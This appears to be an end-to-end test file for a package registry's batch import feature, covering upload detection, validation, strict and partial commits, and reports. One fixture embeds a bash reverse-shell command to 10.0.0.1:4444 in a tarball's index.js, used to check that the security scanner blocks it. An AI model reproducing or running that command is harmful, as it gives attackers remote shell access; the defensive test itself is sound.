import request from 'supertest';
import { ADMIN, createTestApp, type TestContext } from './app-factory';
import { makeNpmTarball, makeZip } from './fixtures';

describe('A1 批量导入与全量校验（e2e）', () => {
  let ctx: TestContext;

  beforeAll(async () => {
    ctx = await createTestApp('import');
  });

  afterAll(async () => {
    await ctx.close();
  });

  it('上传包自动识别 → 全量校验 → partial 入库 → 报告下载', async () => {
    // engines 声明超出默认 Node target，制造校验失败项验证 partial 跳过逻辑
    const good = await makeNpmTarball('e2e-lib', '1.0.0', {
      engines: { node: '>=18' },
      description: '批量导入测试包',
    });
    const incompatible = await makeNpmTarball('e2e-lib-bad', '1.0.0', { engines: { node: '>=99' } });

    const created = await request(ctx.baseUrl)
      .post('/api/v1/import-batches/auto')
      .auth(ADMIN.username, ADMIN.password)
      .attach('files', good, 'e2e-lib-1.0.0.tgz')
      .attach('files', incompatible, 'e2e-lib-bad-1.0.0.tgz')
      .expect(201);
    const batchId = created.body.data.batchId as string;
    expect(batchId).toBeTruthy();
    expect(created.body.data.preview.total).toBe(2);
    expect(created.body.data.preview.newCount).toBe(2);
    expect(created.body.data.failed).toEqual([]);

    const validated = await request(ctx.baseUrl)
      .post(`/api/v1/import-batches/${batchId}/validate`)
      .auth(ADMIN.username, ADMIN.password)
      .expect(201);
    expect(validated.body.data.stats.valid).toBe(1);
    expect(validated.body.data.stats.invalid).toBe(1);

    const batch = await request(ctx.baseUrl)
      .get(`/api/v1/import-batches/${batchId}`)
      .auth(ADMIN.username, ADMIN.password)
      .expect(200);
    const items = batch.body.data.items as { name: string; status: string; reasonCodes: string[] }[];
    expect(items.map((item) => item.status)).toEqual(['VALID', 'INVALID']);
    expect(items[1].reasonCodes).toContain('PKG_RUNTIME_INCOMPATIBLE');

    const committed = await request(ctx.baseUrl)
      .post(`/api/v1/import-batches/${batchId}/commit`)
      .auth(ADMIN.username, ADMIN.password)
      .send({ mode: 'partial' })
      .expect(201);
    expect(committed.body.data.stats).toMatchObject({ committed: 1, skipped: 1, failed: 0 });

    const report = await request(ctx.baseUrl)
      .get(`/api/v1/import-batches/${batchId}/report?format=csv`)
      .auth(ADMIN.username, ADMIN.password)
      .expect(200);
    expect(report.headers['content-type']).toContain('text/csv');
    expect(report.text).toContain('itemNo,ecosystem,name,version,status');
    expect(report.text).toContain('e2e-lib-bad');

    const packages = await request(ctx.baseUrl)
      .get('/api/v1/packages?q=e2e-lib')
      .auth(ADMIN.username, ADMIN.password)
      .expect(200);
    const names = (packages.body.data.items as { name: string }[]).map((item) => item.name);
    expect(names).toContain('e2e-lib');
    expect(names).not.toContain('e2e-lib-bad');
  });

  it('批量 8 个包全部通过校验并完成入库', async () => {
    const names = Array.from({ length: 8 }, (_, index) => `e2e-batch-${index}`);
    let upload = request(ctx.baseUrl)
      .post('/api/v1/import-batches/auto')
      .auth(ADMIN.username, ADMIN.password);
    for (const name of names) {
      upload = upload.attach('files', await makeNpmTarball(name, '1.0.0'), `${name}-1.0.0.tgz`);
    }
    const created = await upload.expect(201);
    const batchId = created.body.data.batchId as string;
    expect(created.body.data.preview.total).toBe(8);
    expect(created.body.data.failed).toEqual([]);

    const validated = await request(ctx.baseUrl)
      .post(`/api/v1/import-batches/${batchId}/validate`)
      .auth(ADMIN.username, ADMIN.password)
      .expect(201);
    expect(validated.body.data.stats).toMatchObject({ valid: 8, invalid: 0, securityBlocked: 0 });

    const committed = await request(ctx.baseUrl)
      .post(`/api/v1/import-batches/${batchId}/commit`)
      .auth(ADMIN.username, ADMIN.password)
      .send({ mode: 'partial' })
      .expect(201);
    expect(committed.body.data.stats).toMatchObject({ committed: 8, failed: 0 });
  });

  it('strict 模式遇到失败项时中止入库', async () => {
    // engines 不满足默认 target：识别阶段正常，校验阶段判 invalid
    const bad = await makeNpmTarball('e2e-strict', '1.0.0', { engines: { node: '>=99' } });

    const created = await request(ctx.baseUrl)
      .post('/api/v1/import-batches/auto')
      .auth(ADMIN.username, ADMIN.password)
      .attach('files', bad, 'e2e-strict-1.0.0.tgz')
      .expect(201);
    const batchId = created.body.data.batchId as string;

    const validated = await request(ctx.baseUrl)
      .post(`/api/v1/import-batches/${batchId}/validate`)
      .auth(ADMIN.username, ADMIN.password)
      .expect(201);
    expect(validated.body.data.stats.invalid).toBe(1);

    const blocked = await request(ctx.baseUrl)
      .post(`/api/v1/import-batches/${batchId}/commit`)
      .auth(ADMIN.username, ADMIN.password)
      .send({ mode: 'strict' })
      .expect(409);
    expect(blocked.body.code).toBe('BATCH_HAS_BLOCKING_ITEMS');
  });

  it('strict 模式下安全拦截在写入前生效，批次零入库', async () => {
    // package.json 本身合法（识别阶段通过），恶意代码在文件层被安全扫描拦截
    const malicious = await makeNpmTarball(
      'e2e-sec-batch',
      '1.0.0',
      {},
      {
        'index.js':
          "const { exec } = require('child_process');\nexec('bash -i >& /dev/tcp/10.0.0.1/4444 0>&1');\n",
      },
    );

    const created = await request(ctx.baseUrl)
      .post('/api/v1/import-batches/auto')
      .auth(ADMIN.username, ADMIN.password)
      .attach('files', malicious, 'e2e-sec-batch-1.0.0.tgz')
      .expect(201);
    const batchId = created.body.data.batchId as string;

    const validated = await request(ctx.baseUrl)
      .post(`/api/v1/import-batches/${batchId}/validate`)
      .auth(ADMIN.username, ADMIN.password)
      .expect(201);
    expect(validated.body.data.stats.securityBlocked).toBe(1);
    expect(validated.body.data.stats.invalid).toBe(1);

    const batch = await request(ctx.baseUrl)
      .get(`/api/v1/import-batches/${batchId}`)
      .auth(ADMIN.username, ADMIN.password)
      .expect(200);
    expect(batch.body.data.items[0].status).toBe('INVALID');
    expect(batch.body.data.items[0].reasonCodes).toContain('SEC_BLOCKED');

    const blocked = await request(ctx.baseUrl)
      .post(`/api/v1/import-batches/${batchId}/commit`)
      .auth(ADMIN.username, ADMIN.password)
      .send({ mode: 'strict' })
      .expect(409);
    expect(blocked.body.code).toBe('BATCH_HAS_BLOCKING_ITEMS');

    const packages = await request(ctx.baseUrl)
      .get('/api/v1/packages?q=e2e-sec-batch')
      .auth(ADMIN.username, ADMIN.password)
      .expect(200);
    expect(packages.body.data.total).toBe(0);
  });

  it('识别失败的单个文件进失败明细，不影响同批其它包入库', async () => {
    // 文件名故意与包内声明不一致：身份必须来自 package.json，而不是文件名
    const tgz = await makeNpmTarball('e2e-auto-lib', '1.2.3', { description: '免清单导入测试包' });

    const created = await request(ctx.baseUrl)
      .post('/api/v1/import-batches/auto')
      .auth(ADMIN.username, ADMIN.password)
      .attach('files', tgz, 'renamed-package.tgz')
      .attach('files', Buffer.from('not a package'), 'readme.txt')
      .expect(201);

    expect(created.body.data.preview.total).toBe(1);
    expect(created.body.data.preview.byEcosystem).toEqual({ npm: 1 });
    expect(created.body.data.failed).toHaveLength(1);
    expect(created.body.data.failed[0].filename).toBe('readme.txt');

    const batchId = created.body.data.batchId as string;
    const validated = await request(ctx.baseUrl)
      .post(`/api/v1/import-batches/${batchId}/validate`)
      .auth(ADMIN.username, ADMIN.password)
      .expect(201);
    expect(validated.body.data.stats.valid).toBe(1);

    const batch = await request(ctx.baseUrl)
      .get(`/api/v1/import-batches/${batchId}`)
      .auth(ADMIN.username, ADMIN.password)
      .expect(200);
    expect(batch.body.data.items[0].name).toBe('e2e-auto-lib');
    expect(batch.body.data.items[0].version).toBe('1.2.3');

    const committed = await request(ctx.baseUrl)
      .post(`/api/v1/import-batches/${batchId}/commit`)
      .auth(ADMIN.username, ADMIN.password)
      .send({ mode: 'partial' })
      .expect(201);
    expect(committed.body.data.stats.committed).toBe(1);
  });

  it('zip 压缩包自动解压：子目录有效、无关文件与嵌套 zip 进失败明细', async () => {
    const a = await makeNpmTarball('e2e-zip-a', '1.0.0');
    const b = await makeNpmTarball('e2e-zip-b', '1.0.0');
    const inner = makeZip({ 'inner-e2e-zip-c-1.0.0.tgz': await makeNpmTarball('e2e-zip-c', '1.0.0') });
    const zipBuf = makeZip({
      'e2e-zip-a-1.0.0.tgz': a,
      // 子目录条目取 basename 识别
      'nested/e2e-zip-b-1.0.0.tgz': b,
      'readme.txt': Buffer.from('not a package'),
      'inner.zip': inner,
    });

    const created = await request(ctx.baseUrl)
      .post('/api/v1/import-batches/auto')
      .auth(ADMIN.username, ADMIN.password)
      .attach('files', zipBuf, 'bundle.zip')
      .expect(201);
    expect(created.body.data.preview.total).toBe(2);
    expect(created.body.data.preview.newCount).toBe(2);
    const failed = created.body.data.failed as { filename: string; reason: string }[];
    expect(failed.map((f) => f.filename).sort()).toEqual(['inner.zip', 'readme.txt']);
    expect(failed.find((f) => f.filename === 'inner.zip')?.reason).toContain('嵌套');

    const batchId = created.body.data.batchId as string;
    const validated = await request(ctx.baseUrl)
      .post(`/api/v1/import-batches/${batchId}/validate`)
      .auth(ADMIN.username, ADMIN.password)
      .expect(201);
    expect(validated.body.data.stats.valid).toBe(2);

    const batch = await request(ctx.baseUrl)
      .get(`/api/v1/import-batches/${batchId}`)
      .auth(ADMIN.username, ADMIN.password)
      .expect(200);
    const names = (batch.body.data.items as { name: string }[]).map((item) => item.name).sort();
    expect(names).toEqual(['e2e-zip-a', 'e2e-zip-b']);

    const committed = await request(ctx.baseUrl)
      .post(`/api/v1/import-batches/${batchId}/commit`)
      .auth(ADMIN.username, ADMIN.password)
      .send({ mode: 'partial' })
      .expect(201);
    expect(committed.body.data.stats.committed).toBe(2);
  });
});
